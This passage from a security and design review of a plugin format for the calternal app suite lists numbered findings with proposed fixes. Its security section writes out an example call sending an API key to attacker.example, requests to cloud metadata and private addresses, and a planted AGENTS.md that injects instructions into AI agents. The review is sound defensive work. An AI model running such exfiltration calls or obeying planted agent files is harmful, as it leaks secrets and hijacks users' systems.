  unpatterned file it changes nothing but the path."

### 34. `together:` and added fields, and what "both versions" means

- **Section:** §2.11, §7.2.
- **Text:** "when two devices changed the group, both versions are kept."
- **Failing examples:** a geotag plugin adds `lat` and `lng` to Notes with
  `extends:`; `together:` is not among `extends:`'s five sub-keys, so a
  conflict merges them independently into a point that neither device
  wrote. "Both versions are kept" has no representation inside one item: a
  conflict copy file? Two values in the frontmatter? A choice in the
  Problems list? On an operations-only kind there is no file to copy.
- **Severity:** bug.
- **Smallest fix:** allow `together:` inside an `extends:` target, over that
  plugin's own added fields only; "both versions are kept as the item's
  value plus a conflict record in host state, shown on the item until a
  person picks one; the item is listed in Problems."

### 35. Where `default where:` applies

- **Section:** §2.13.
- **Text:** "Every collection over the kind applies it unless its `from:`
  says `ignoring default`."
- **Failing examples:** Photos' `default where: not hidden`. People shows
  `photos: = count(from(photos.people))`, which includes hidden photos, so a
  person reads "12 photos" and sees 10. Search is not a collection, so hidden
  photos appear in search results, which is the opposite of Hidden. Sidebar
  `each:` lines and `all()` are not said either way.
- **Severity:** bug.
- **Smallest fix:** "`default where:` applies to collections, search,
  `each:`, `from()` and `all()`, unless `ignoring default` is written in the
  `from:` line or the function (`from(photos.people, ignoring default)`).
  A link to a hidden item still opens it."

### 36. `on.after` loops between two plugins

- **Section:** §7.7, §8.2.
- **Text:** "A plugin's own writes do not fire its own `on.change` … Call
  depth 8 applies to reactions."
- **Failing example:** A listens after `B.file`, and its handler calls
  `B.tag`; B listens after `A.sort` and calls `A.sort` again from `B.tag`'s
  side effects. Each delivery is a new asynchronous run, so a depth counter
  that lives in one call stack restarts at 1 each time. Nothing says whether
  A receives `on.after` for a B operation that A itself called. When depth 8
  is reached, the handler fails, and "delivered at least once" redelivers it
  forever.
- **Severity:** bug.
- **Smallest fix:** "The depth travels with the event key across
  deliveries. A plugin never receives `on.after` or `on.change` for a
  commit its own code caused, directly or through `s.call`. An event at
  depth 8 is not delivered and is shown on the plugin's Problems."

### 37. Offline work refused on reconnect

- **Section:** §2.19 "Offline (S1)", §11, §2.12.
- **Text:** "built-ins, one-liners, open, timer and record operations apply
  at once on the device and sync later"; "A write that fails a check is
  refused".
- **Failing example:** Lee, an editor, logs three transactions on a plane.
  Meanwhile the Owner applies a profile with `calternal-money.transactions:
  change manager`. On landing, every replayed write is refused. The document
  does not say whether Lee's transactions vanish, stay on the phone, or wait.
  The same happens when a `checks:` line or `unique:` refuses a replay.
- **Severity:** bug (data loss). This is owner question 3 (§F).
- **Smallest fix:** see owner question 3.

### 38. A record operation racing a whole-file WebDAV edit

- **Section:** §2.8, §2.19, §8.1.
- **Text:** "`change record(item, anchor, record)`, `remove record(item,
  anchor)`".
- **Failing example:** the phone appends a set offline. Meanwhile a laptop
  editor saves the session file over WebDAV without `If-Match`. If the server
  takes the PUT as the new whole file, the appended set is lost. If the PUT
  removed an anchor, a queued `change record` has nothing to change.
- **Severity:** bug.
- **Smallest fix:** "A PUT without `If-Match` to an item with records is
  merged three-way against the version the client last fetched (by ETag
  history), and record operations are replayed by anchor. An operation
  whose anchor is gone becomes a Problem with its values, never a silent
  loss."

### 39. An added field and an owner's field with the same name

- **Section:** §7.2.
- **Text:** "Added fields are stored in the item's frontmatter under the
  adding plugin's name … `row: + saved`."
- **Failing example:** Reading List adds `saved` to Mail; Mail 2.0 adds its
  own `saved`. Storage is fine (`saved` and `calternal-reading-list.saved`),
  but `row: + saved`, the mark `= contains(from, …)` and every other
  plugin's collection `where: saved` now mean a different field. How does a
  third plugin's collection even name the added field? With a hyphen, it is
  a subtraction (finding 4).
- **Severity:** bug.
- **Smallest fix:** "Inside an `extends:` block, a bare name means the
  plugin's own added field first. Everywhere else, an added field is written
  in full, `[calternal-reading-list.saved]`."

### 40. `any kind with <type>` is fuzzy and drifts after consent

- **Section:** §7.2.
- **Text:** "`any kind with url|file|person|place|time|date` … resolves at
  install … and again when a kind is installed later."
- **Failing examples:** does `time` match a `when` field? Does `date` match
  `dates`? A computed `url`? Does `file` mean a `file` field or a file item?
  Does it include `shown: no` kinds (Mail's outbound queue) and
  operations-only kinds? The person agreed when Reading List was installed;
  Mail installed next week silently gets "Save link" on every message, and
  Mail's own install sheet does not say so.
- **Severity:** bug (and a consent gap).
- **Smallest fix:** "`with <type>` matches stored fields of exactly that
  type, excludes hidden kinds, and a later kind's install sheet lists the
  additions it receives, each of which the installer can turn off."

## C. Security: what the format itself opens

The baseline is §12 and the extension audit's §3. Each item below is a path
through declared lines alone.

### 41. Outside addresses answer on the server's own origin

- **Section:** §7.4, §8.2.
- **Text:** "Each name is an address under the plugin's own path,
  `/outside/<space>/<plugin>/<name>/…` … the operation answers with a
  status, headers and a body. So a plugin can serve any protocol or API
  itself."
- **Failing example:** a plugin answers `GET` with `Content-Type: text/html`
  and a script. It runs on the app's origin, reads the app's storage, calls
  the API with the visitor's session: plugin code in the client outside a
  frame (§12). It can also send `Set-Cookie` for the app's domain, a
  `Location` to a phishing page on a trusted URL, or
  `Access-Control-Allow-Origin`. If the `person` proof accepts the session
  cookie, any outside `GET` is a cross-site request forgery.
- **Severity:** blocks (security).
- **Smallest fix:** owner question 1 (§F).

### 42. A "description-only" plugin may ship frames

- **Section:** §1.1, §7.5.
- **Text:** "A plugin without `operations.ts` and without `sends out`,
  `sign-ins`, `secrets` or `programs` is a **description-only plugin**. Any
  member may add one."
- **Failing example:** a member adds a plugin with no code and `sends out`
  unset, whose `fills: kind calternal-mail.messages panel: frame
  frames/summary.html` receives the open mail. In a browser the frame can
  reach the internet (primitives T4: "not contained on the web"). The install
  sheet said it sends nothing. Primitives §4.6 has the Owner install web code
  "after a plain warning"; §1.1 lets any member do it.
- **Severity:** blocks (security).
- **Smallest fix:** owner question 2 (§F); at the least, add "or `frames/`"
  to §1.1's list.

### 43. `folder:`, `template:` and the kind body reach places they should not

- **Section:** §1.1, §2.3, §2.16.
- **Text:** "`folder` Where items live, a pattern"; "The kind file's body is
  written into that folder as its `AGENTS.md`."
- **Failing examples:** a member's description-only kind with `folder:
  .calternal/plugins` and `editable: outside` makes definition files its
  items. `folder: Mail` with `editable: outside` claims Mail's
  operations-only files, which are then listed over WebDAV and editable.
  `folder: Notes` overwrites `Notes/AGENTS.md` with text every agent working
  in Notes reads ("before any task, fetch …"), a prompt injection any member
  can install. `template: ../../.calternal/agent-rules.md` reads outside the
  plugin.
- **Severity:** blocks (security).
- **Smallest fix:** "A folder pattern is relative, has no `..`, never starts
  with `.calternal`, and may not equal or contain another installed kind's
  folder; a clash refuses the install. A template path stays inside the
  plugin's `templates/`. `AGENTS.md` is written only into a folder the kind
  created, and begins with the plugin's name."

### 44. Secrets are not tied to a destination

- **Section:** §7.1, §8.1.
- **Text:** "`secrets` Fixed secrets the Owner enters (an API key)";
  "`s.fetch(req, { secret?, sign-in? })` An HTTP request to a declared
  destination".
- **Failing example:** `sends out: the public web` with `secrets: maps
  key`. Every host is declared, so `s.fetch("https://attacker.example",
  { secret: "maps key" })` hands the key away. `sign-ins:` makes `for` optional
  too.
- **Severity:** blocks (security).
- **Smallest fix:** "`secrets: <name> for <host>` and `sign-ins: … for
  <host>` are required; the server attaches a secret only to requests for
  its host."

### 45. `the public web` and `a server you name` reach the inside

- **Section:** §7.1, §7.3.
- **Text:** "`sends out` `nothing`, or a list of hosts, `a server you name`,
  `the public web`".
- **Failing example:** `s.fetch("http://169.254.169.254/…")`,
  `http://localhost:…`, a mesh address of another machine, or a name that
  resolves to a public address at check time and to `10.0.0.5` at
  connection time. `a server you name` with `10.0.0.1:25` for SMTP.
- **Severity:** blocks (security).
- **Smallest fix:** "`the public web` and `a server you name` exclude
  loopback, link-local, private, carrier-grade and mesh ranges and the
  server's own addresses, checked on the connected address after DNS. The
  operator may allow named private hosts."

### 46. Remote loads as a way out that no line declares

- **Section:** §2.18, §5.2, §14 P3.
- **Text:** "`<entry>` is a field, or one of `body`, `properties`, `image`,
  `preview`"; "`gallery: <image field|preview>`".
- **Failing example:** a description-only plugin adds a field `cover` to
  Mail messages through `extends:`, with a one-liner `set cover = <formula>`,
  and shows it with `page: +` or a gallery. If a `url` value is drawn as an
  image or a link preview, the viewer's device or the server fetches it,
  carrying whatever the formula put in it. Whether formulas can build text
  (`+` on text, `format()`) is not said, which decides whether this is a leak
  or only a tracking pixel. The fifth set's `page: web(<field>)` loads remote
  images in mail by default unless stated.
- **Severity:** bug (security).
- **Smallest fix:** owner question 5 (§F).

### 47. Record authorship over WebDAV

- **Section:** §2.8.
- **Text:** "The authority for who wrote a record is the history ledger, not
  the header."
- **Failing example:** on an editable-outside kind with records, Lee edits
  the file over WebDAV, changes the text of Ana's record and adds a new block
  headed `**Ana** · …`. The ledger knows better, but the page draws
  something: if it draws the header, Lee has posted as Ana (§12 "author
  stamp"). "Only the author changes a record" cannot hold for whole-file
  writes unless they are diffed.
- **Severity:** bug (security).
- **Smallest fix:** "The page draws a record's author from the ledger. An
  outside write that changes or adds a record not by the writer, or outside
  the operation's window, is refused (finding 12)."

### 48. Additions that imitate the owner's warnings

- **Section:** §7.2, §7.5, §2.18.
- **Text:** "`row: +` and `page: +` … never cover `protected:` fields";
  "`kind <kind> list` single … the rows of a window".
- **Failing examples:** a member's description-only plugin adds a mark
  "Verified sender" on Mail messages where `contains(from, "@bank.")`. It
  covers nothing protected; it is still a lie on every member's mail, and the
  install sheet's "the person can turn each off" is the installing member,
  not the others. A `kind calternal-mail.messages list` replacement drawn as a
  frame decides itself whether to draw the protected outside-sender
  warning; the host cannot force a frame to draw a field.
- **Severity:** bug (security).
- **Smallest fix:** "A mark or row addition is drawn with the adding
  plugin's icon, never in the host's warning style. Additions from a plugin
  a member (not the Owner) added are shown only to members who turn them on.
  Protected fields are drawn by the host in a strip outside any replacement
  frame."

### 49. `data` fields and other bindings are writable over WebDAV

- **Section:** §3, §2.5.
- **Text:** "`data` A structured value only the plugin's code changes, shown
  read-only (a sync binding)".
- **Failing example:** Calendar's `source` (account, href, ETag) on an
  editable-outside kind. A member edits `source.href` over WebDAV to another
  calendar's event; Calendar's push-upstream code then writes there with the
  account's sign-in.
- **Severity:** bug (security).
- **Smallest fix:** "An outside write that changes a `data` field is refused
  (finding 12)."

### 50. A plugin's identity is a string anyone may take

- **Section:** §7.1, §7.2.
- **Text:** "`plugin` ID, `calternal-<name>` for official ones"; "When the
  adding plugin is removed they leave the view and the values stay."
- **Failing examples:** plugins come from any Git address (G7). Nothing
  reserves `calternal-`, so `calternal-mail` from a stranger's repository
  looks official on the install sheet. After Reading List is removed, a
  different plugin installed under the ID `calternal-reading-list` inherits
  every `calternal-reading-list.*` value, its settings and its `s.state`, and
  the right to write them.
- **Severity:** bug (security).
- **Smallest fix:** "A plugin is its ID plus its source (Git address or
  signing key). `calternal-` is reserved for the operator's list. A plugin
  installed under a removed plugin's ID from another source starts empty;
  the old values stay read-only."

### 51. `on.after` carries other plugins' inputs, perhaps credentials

- **Section:** §7.7, §8.2.
- **Text:** "`{ input, result }`, filtered to what the acting person may
  read"; install sheet: "Reacts after Mail receives a message".
- **Failing example:** a plugin with `listens: after calternal-mail.send` and
  `sends out: the public web` receives every outgoing mail and recipient
  list. The person *may* read them, so the filter passes everything. The
  sheet says it "reacts", not that it reads what you send. If an operation's
  input includes a password (an account setup form), it is delivered too.
- **Severity:** bug (security).
- **Smallest fix:** "The install sheet says what the event carries ('Sees
  every mail you send, with its recipients'). Inputs of sign-in or secret
  fields are never delivered. A listener that also sends out is a risky
  install (passkey)."

### 52. A description-only plugin can make the server compute without bound

- **Section:** §4.3, §7.2.
- **Text:** "A fixed step budget per item"; `extends:` `fields:` take "field
  line as in §2.7", which includes computed fields.
- **Failing example:** a member adds a description-only plugin that adds
  `noise: = count(from(calternal-mail.messages.thread, contains(subject,
  "re")))` to 200,000 messages. Each item is within its budget; the space's
  index rebuild is not. No per-plugin budget exists.
- **Severity:** bug.
- **Smallest fix:** "Computed fields added through `extends:` may not use
  `from()` or `all()`. Each plugin has an index budget per space (operator
  default); over it, its computed fields show 'too costly' and the Owner is
  told."

## D. Do the examples parse?

I parsed §17 as written and three suite kinds after rewriting their
superseded lines the way §15 and §16 direct (no `repeat:` key, no `card:`,
search without weights, `sign-ins` for `secrets … per`). What fails after
that is the grammar's own failure.

### 53. Reading List (§17)

Severity of the finding as a whole: bug (the example does not install as
written).


- `collections/all.md`: **`board: read` fails.** §5.2 says `board: <choice
  field>` and `read` is yes/no. Either allow yes/no boards (two columns) or
  change the example. Bug (the full example does not install).
- `operations.ts`: **`s.me` in an `on.time` event is undefined** (finding
  20). Blocks.
- `plugin.md`: `sends out: nothing`. §1.1 defines description-only as
  "without `sends out`", so a literal reading says that declaring "nothing"
  makes the plugin not description-only. Wording.
- `kinds/reading.md`: parses. Two silent points: an item created over
  WebDAV without `added` or `read` (finding 13), and `where: not read` on such
  an item (finding 8). `search: title, site, body` puts a computed field in
  search, which §2.15 does not say is allowed.

### 54. Calendar `events` (suite §1)

Severity: bug. Fails on five lines after the superseded ones are removed:

- `own calendar: = calendar or first(under(tags, "area"))` and `ends: = end
  or start + if(all day, 1d, 15m)`: `or` on links and times (finding 8).
- `did not happen: set status = did not happen, …`: the bare value contains
  `not` (finding 7).
- `ical: VEVENT` with children (finding 2).
- `change: only …, when empty(source) or source.owned`: a dot into a `data`
  field (finding 6).
- The `today` collection's `day(start)`: no `day()` function exists; §4.2
  has `date(t)`. Install refuses the file "naming the function".
- `people: links(contacts)` follows §3 but not §1.2, which wants
  `calternal-contacts.contacts`. One of the two sections is wrong (wording).

### 55. Tasks `tasks` (suite §2)

Severity: bug. Fails on six lines:

- `matrix: priority in (urgent, high), urgent` (finding 7, H16).
- `add: …, line in today, phrases`: `line in today` is neither a field nor a
  flag.
- `done: …, swipe, primary`: two placements (finding 15).
- `urgent: = … days(settings.urgent within)`: `days()` takes two arguments,
  and the per-person setting cannot live in the index (finding 24).
- `time spent: = sum(from(calternal-calendar.events.task, logged).length)`:
  the hyphen (finding 4), and Calendar's `events` has no `task` link field
  and no `length`.
- `from: lines(checkbox) where empty(task)` (Loose ends): a `where` inside
  `from:` is not grammar, and the row fields are undefined (finding 17).
- The sidebar's tag entries have no form (finding 18).

### 56. Workouts `sessions` (suite §3)

Severity: bug. Fails on two lines:

- `file: {date:YYYY-MM-DD} {plan day.name}`: a dot in a pattern is not in
  §2.3's grammar, and `plan day` is neither required nor defaulted, which
  §2.3 requires of pattern fields.
- Weekly volume: `chart line: sum(volume) by week(date)` over
  `sessions.records`: the record has no `date`; it must be `week(item.date)`,
  or the record's own time, which has no name (finding 11).
- `change record: weight, reps, reps in reserve` with no `within`: parses,
  with an undefined window (finding 11).

### 57. What the parse check says overall

The line grammar works for the simple 80 %: every `key: value` header,
every flat field line, every one-liner without commas in its condition.
Every failure above sits in one of four places: splitting (findings 1 to 3),
names (4 to 7), empty and `or` (8), and records (11). Fixing those four
makes all four files parse, apart from the suite's own mistakes (`day()`,
`line in today`, the missing `task` link). Severity: wording (a summary;
each failure is counted in its own finding).

### 58 to 63. Size

**58. Concepts for a description-only author** (everything usable without
code): 7 file types, 6 header rules, 5 naming forms, 24 kind keys, 6 field
flags, 27 field types and built-ins, 10 code-free operation forms with 3
placements and 2 `add` flags, 7 kinds of value, 13 operators, 6 name forms,
26 functions, 13 collection keys, 12 views, 5 sources, 5 sidebar line forms,
about 11 `plugin.md` keys, 5 `extends:` sub-keys and 2 kinds of target, 13
places, 11 theme keys and 8 profile keys: **about 227 named things.** §17's
Reading List uses about 35 of them. Wording: §18's counts are right, but the
document never says which subset a first plugin needs.

**59. Concepts a coded author adds:** 13 calls and 7 `s.write` change forms,
7 events, 10 error codes, 6 delivery rules (at least once, the key,
coalescing, own writes, depth, one process), and 9 `plugin.md` keys with
their forms (`reads`, `calls`, `sends out` ×3, `sign-ins` ×4 protocols,
`secrets`, `programs`, `outside` ×3 proofs, `listens`, `slots`): **about 65
more, about 290 in all.** Wording.

**60. `add: …, share` and `fills: receive:` say one thing twice.** Both put
the plugin in the system share sheet; with both, Reading List appears twice.
Wording; drop `share` (§H).

**61. `first run:` exists in `fills:` (§7.5) and in `space.md` (§11).** The
fill has no app parameter, the profile line does. Bug: two plugins can fill
"first run" of one app, and nothing says which runs. Keep only the profile
line, and finding 20's acting person applies (the first run runs as the
Owner, not as whichever member opened the app first).

**62. Theme files** (§10): `palette:` is eight positional colours with no
meaning per position; `icons: files/icons/` and `wallpaper: files/dusk.avif`
name a `files/` folder that §1.1's plugin layout does not have; `fonts:
interface: Google Sans Flex` by name implies a download from somewhere not
in `sends out`. Blocks (themes).

**63. CalDAV mapping directions** (§2.17): "Unmapped properties … are kept
exactly" without saying where in a Markdown item; `body: DESCRIPTION, unless
not empty(source)` without saying whether `unless` applies to reading,
writing or both; CalDAV writes to an operations-only kind ("an ordinary
write") when such kinds refuse outside writes (§2.5). Bug.

## E. Fixes for the coordinator (detail)

Each is the smallest fix given with its finding. Grouped so they can be
applied as one edit per section.

1. **§1.3, one parsing paragraph:** findings 1, 2, 3 (splitting, nesting,
   quotes, comments, brackets).
2. **§1.2 and a new §1.5 "Names":** findings 4, 5, 6, 14 (name grammar,
   reserved words, resolution and scope, per-plugin IDs and install paths,
   the `space` plugin for app-made kinds).
3. **§4.1:** findings 7, 8, 9 (quoted choice values, precedence, empty,
   `first(a, b, …)`, units, money, `format` patterns).
4. **§3, a "Written as" column:** finding 10, with the YAML subset.
5. **§2.8:** finding 11 (record fields, ends, built-ins, window).
6. **§2.5, an "Outside writes" paragraph:** findings 12, 13, 33, 38, 47, 49.
7. **§2.19:** findings 15 and 16.
8. **§5 and §6:** findings 17 and 18.
9. **§9:** finding 19.
10. **§8:** findings 20, 21, 22, 23, 36 (acting person, keys, the write
    table, `s.share`, depth across deliveries).
11. **§4.3:** findings 24, 25, 26, 27, 52.
12. **§2.7, §2.10, §2.11, §2.13, §2.14:** findings 28, 29, 30, 31, 32, 34, 35.
13. **§7.2:** findings 39, 40, 48, 51.
14. **§7.1 and §7.3:** findings 43, 44, 45, 50 (these only narrow what is
    allowed, so they need no owner answer unless the coordinator disagrees).
15. **§10, §11, §2.17, §17:** findings 53, 61, 62, 63.

## F. Questions for the owner (high level)

### 1. May a plugin's outside address answer on the server's own web address?

**What it is.** C2 lets a plugin answer any HTTP request under
`/outside/<space>/<plugin>/…`, with its own status, headers and body. That
path is on the same web address as the app.

**Why now.** The server's router and cookie rules are built first; changing
the address later breaks every webhook URL people have pasted into other
services.

**Example.** An automation plugin answers a GitHub webhook (fine). A hostile
plugin answers `GET` with a web page whose script runs as the app, reads the
signed-in person's session and calls the API as them.

**Options.** (a) A separate web address for all outside traffic
(`outside.<server>`), no cookies there, every response marked as sandboxed:
safe; costs a second name and certificate for the operator. (b) The same
address, with the server removing `Set-Cookie`, forcing a sandboxing header
and refusing HTML: cheaper, but every new header is a new hole to close. (c)
As written: a plugin can run code as the app.

**Recommendation.** (a). It is the only option where a mistake in the filter
does not become plugin code inside the app, and the operator sets the name
once.

### 2. May any member add a plugin that ships web code?

**What it is.** Any member may add a "description-only" plugin. As written,
such a plugin may still ship frames (web pages drawn in a panel), and in a
browser a frame can reach the internet whatever `sends out` says.

**Why now.** It decides the install rule the server builds first, and
whether the install sheet's "Sends nothing" is true.

**Example.** A member adds "Mail summaries" with no code and no `sends out`;
its panel receives each mail a person opens and posts it to a server.

**Options.** (a) A plugin with frames is not description-only: only the
Owner installs it, after the web warning; costs members the ability to add
small visual plugins. (b) Frames from member plugins run with no network at
all (a strict content policy), so they draw but cannot send; costs some
frame features (web fonts, remote images) and relies on the browser
honouring the policy. (c) As written.

**Recommendation.** (a) now, and (b) later if members ask for frames: (a) is
one line in §1.1 and matches the primitives proposal's "the Owner installs
web code".

### 3. What happens to offline work the server refuses on reconnect?

**What it is.** One-liners and record operations apply on the device at
once and sync later. On reconnect the server may refuse them: a profile
raised the role, a check fails, or a unique item already exists.

**Why now.** It decides how the device's outbox stores pending work, which
is built with the first offline operation.

**Example.** Lee logs three transactions on a plane; meanwhile the Owner
makes transactions manager-only. On landing all three are refused.

**Options.** (a) Drop them and tell Lee: simplest; loses Lee's typing. (b)
Keep each as "not accepted" in the outbox, with the reason and a button to
copy it or ask a Manager to apply it: costs one more outbox state and
screen. (c) Apply them anyway because they were made under the old rights:
the device would decide rights, which the server must never accept.

**Recommendation.** (b). Nothing typed is ever lost, and the server's rule
still wins.

### 4. May a notification carry text a plugin wrote?

**What it is.** §12 says "free notification text" is never open, but
`s.notify(people, { item, text })` takes free text, and §17's example uses
it.

**Why now.** Notifications reach other people and lock screens; the call's
shape is part of the first plugin.

**Example.** A plugin notifies every member "Your password expired: sign in
at …" on the lock screen.

**Options.** (a) No free text: the notification shows the app's name and the
item's row; costs plugins every custom message. (b) Text from a template the
plugin declares in `plugin.md` with the item's fields as placeholders,
shown on the install sheet; costs one more key. (c) Free text, shown only
inside the app and never on a lock screen.

**Recommendation.** (b): the install sheet shows every sentence a plugin can
send, which is the same rule as `sends out`.

### 5. Which remote content may the app load on its own?

**What it is.** Pages, galleries and link previews may draw a `url` value as
an image or preview, and the fifth set adds HTML mail bodies. Loading them
is a request to somewhere the install sheet never listed, and the address
can carry data.

**Why now.** It decides the image and preview pipeline of Reading List,
Photos and Mail, the first plugins.

**Example.** A member's description-only plugin adds a `cover` field to every
mail with the subject inside the address, and shows it in a gallery: every
viewer's device sends the subject to that server.

**Options.** (a) Never load remote content automatically; a person taps to
load, per item or per sender: safest; Reading List shows no thumbnails until
tapped. (b) Load only stored values (never computed or added fields), through
the server's proxy, without cookies: costs proxy bandwidth; leaks only that
the item was viewed. (c) Load anything.

**Recommendation.** (b), with (a) for mail bodies by default, which is what
mail apps do.

## G. What I did not check

- The money, mail and chat stress test's kinds, beyond counting their kind
  and collection IDs for finding 14.
- Photos, Files, Documents and Notes in the suite, except where named.
- The inherited ADRs (0023, 0025, 0028, 0045, 0056, 0063 to 0068): I took
  the format's summaries of them as true.
- The formulas research and the agent-rules research, which the format cites.
- Whether the fifth set's merges, once applied, fix or move any finding.
  Where I saw an overlap, I wrote the finding against the text as it stands.
- Apple's limits on notifications, share targets and web views.
- Any cost: no parser was written, so "blocks" means the text, not a
  measurement.

## H. Simplification opportunities

- **Drop `share` on the `add` line.** `fills: receive: … -> operation add`
  says the same and also says which payload goes to which field.
- **Drop `first run` from `fills:`.** `space.md`'s `first run:` already names
  the app and the operation.
- **Fold `on.schedule` into `on.time`.** A repeat field "arrives" at each
  occurrence; one event with one argument shape is one less to learn.
- **One per-person store.** `s.state` and the fifth set's `state:` section
  both hold per-person plugin data. Keep the declared section, and make
  `s.state` its code view.
- **`shown: no` and `keep:` as one key:** `hidden: keep 90d`. A hidden kind
  must state `keep` anyway, so two keys carry one decision.
- **Merge `strip` into `compact`.** Both are small lists; the place (a
  carousel or a widget) decides the layout.
- **`matrix:` as a board with two conditions** (`board: <condition>,
  <condition>`), so the board's drop rule covers the matrix too.
- **Derive `needs:` from the targets of `reads:`, `calls:`, `extends:` and
  `listens:`,** keeping `needs:` only for versions and `optional`.
- **Write the subset.** A "first plugin" page that lists the 35 or so names
  Reading List uses would do more for authors than any merge: about 227
  names are available without code, and a first plugin needs a sixth of
  them.
